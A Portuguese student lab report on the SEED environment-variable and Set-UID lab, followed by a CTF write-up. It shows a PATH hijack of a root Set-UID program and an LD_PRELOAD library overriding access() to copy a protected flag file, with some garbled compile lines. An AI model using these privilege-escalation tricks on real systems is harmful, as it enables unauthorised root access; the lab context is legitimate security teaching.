# Trabalho realizado na Semana #4

## Environment Variable and Set-UID Program Lab

### Task 1:

No primeiro passo, usámos o comando ‘printenv’ para visualizar as variáveis de ambiente no terminal, como mostrado na captura de tela.

<img src="/images/image.png">

Em seguida, utilizámos o comando ‘printenv PWD’ para exibir a variável de ambiente PWD no terminal, como demonstrado na captura de tela.

<img src="/images/image2.png">

Prosseguimos para os comandos ‘export’ e ‘unset’, que foram usados para definir e eliminar uma variável de ambiente, como ilustrado nesta captura de tela:

<img src="/images/image3.png">

### Task 2:

Conforme solicitado na primeira etapa, compilámos e executámos o código contido em ‘myprintenv.c’. O resultado foi armazenado num arquivo chamado ‘file’, que continha todas as variáveis de ambiente, como mostra na captura de tela:

<img src="/images/image4.png">

Em seguida, seguimos o passo 2, descomentando o segundo ‘printenv()’ e comentando o primeiro. Compilámos e executámos o código novamente e, desta vez, o resultado foi salvo no arquivo ‘file2’, que também continha todas as variáveis de ambiente, conforme demonstrado em seguida:

<img src="/images/image5.png">

Finalmente, no passo 3, usámos o comando ‘diff’ para comparar os arquivos ‘file’ e ‘file2’, mostrando que não havia diferenças entre eles, como está evidenciado a seguir. Isto permite-nos concluir que as variáveis de ambiente do processo pai são transferidas para o processo filho sem perda de informações.

<img src="/images/image6.png">

### Task 3:

Seguindo o que foi pedido, compilámos e executámos o código contido em ‘myenv.c’. Na primeira execução, não foi apresentada nenhuma saída no terminal, como demonstrado:

<img src="/images/image7.png">

Em seguida, passamos para o passo 2, modificando uma linha de código e compilando e executando o código novamente. Desta vez, as variáveis de ambiente foram exibidas no terminal, conforme demonstrado nesta captura de tela:

<img src="/images/image14.png">

Podemos concluir que o último parâmetro da função ‘execve()’ corresponde ao ambiente no qual o comando é executado. Quando passamos ‘NULL’ como ambiente, nenhuma variável de ambiente é mostrada. No entanto, quando passamos ‘environ’ (o ambiente atual do usuário), todas as variáveis de ambiente são exibidas, como aconteceu na tarefa anterior.

### Task 4:

Após compilar e executar o código no arquivo ‘task4.c’, todas as variáveis de ambiente foram exibidas, como está ilustrado na captura de tela que se segue. Isto indica que a função ‘system()’ passa as variáveis de ambiente como um array para a função ‘execve()’.

<img src="/images/image8.png">

### Task 5:

Após criar o código no arquivo ‘task5.c’, compilá-lo, definir a propriedade como root e torná-lo um programa Set-UID, além de criar três variáveis de ambiente (PATH=/usr/bin, LD_LIBRARY_PATH=/home/seed/FSI, X=isto), ao executar o programa, observámos que todas as variáveis criadas aparecem no processo filho, exceto a variável LD_LIBRARY_PATH, por razões de segurança para evitar o controlo de links dinâmicos através de executáveis Set-UID.

<img src="/images/image9.png">
<img src="/images/image10.png">


Captura de ecrã variáveis de ambiente demonstradas por printenv, que incluem LD_LIBRARY_PATH:

<img src="/images/image11.png">
<img src="/images/image12.png">

### Task 6:

Para realizar esta tarefa, começámos por modificar a variável de ambiente PATH para incluir o diretório onde criámos os arquivos como o primeiro local para procurar o comando solicitado. Em seguida, compilámos o código fornecido no arquivo ‘task6.c’, definimos a propriedade como root e tornámos o programa num Set-UID. Em seguida, criámos um novo código no arquivo ‘attack.c’ com dois ‘printf()’ para indicar se o processo tem permissões de root ou não:

<img src="/images/image15.png">

Ao compilar o programa ‘attack.c’ com o nome ‘ls’ e executar o resultado da compilação do código ‘task6.c’, o código do primeiro é executado devido ao uso de um caminho relativo no comando ‘system()’. O ‘printf’ no terminal informa que o processo não tem permissões de root:

<img src="/images/image17.png">

No entanto, se executarmos o comando fornecido no enunciado ($ sudo ln -sf /bin/zsh /bin/sh), o mecanismo de segurança do ‘sh’ é contornado. Portanto, ao executar novamente o programa, o ‘printf’ informa que o processo tem permissões de root:

<img src="/images/image16.png">

## Environment Variable and Set-UID Program CTF

Em primeiro lugar, acedemos ao servidor descrito no contexto com o programa netcat.
Ao entrar no sevidor, podemos ler os ficheiros que lá estão guarados, e de destaque: 
- o ficheiro "admin_note.txt", que descreve que temos acesso a criar folders no diretorio "/tmp";
- o ficheiro "my_script.sh", que faz chamadas que vão buscar environment variables ao diretório "/env";
- o ficheiro "main.c", que usa a função access;

Após uma pesquisa na internet, descobrimos que a função acccess tem o seguinte formato: `int access(const char *pathname, int mode);`

Para além disso, ao correr o código `echo "LD_PRELOAD=/tmp/libtentei.so.1.0.1" > env;`
permite guardar as variaveis de ambiente para uma library nossa;

Depois disso, como só podemos escrever código no /tmp, acedemos à pasta e escrevemos o seguinte programa:

` echo #include <stdio.h> `
` #include <stdlib.h> `

`int access(const char *pathname, int mode){`
`    system("/usr/bin/cat /flags/flag.txt > /tmp/sucesso.txt);`
`   return 0;`
`} > qwe.c; `

Com o programa escrito, compilamos o código da seguinte maneira:

`gcc -fPIC -g -c tentei.c;`
`gcc -sgared -o libtentei.so.1.0.1 qwe.o -lc;`

De forma a termos acesso ao ficheiro para onde vamos escrever a informação do tmp, criamos o ficheiro de texto com: `touch sucesso.txt`
e por último damos acesso ao admin para o ficheiro sucesso com `chmod 777 sucesso.txt;`

É de notar que este exercício foi bastante facilitado após a realização do exercício 7 do guião de Enviornment variables;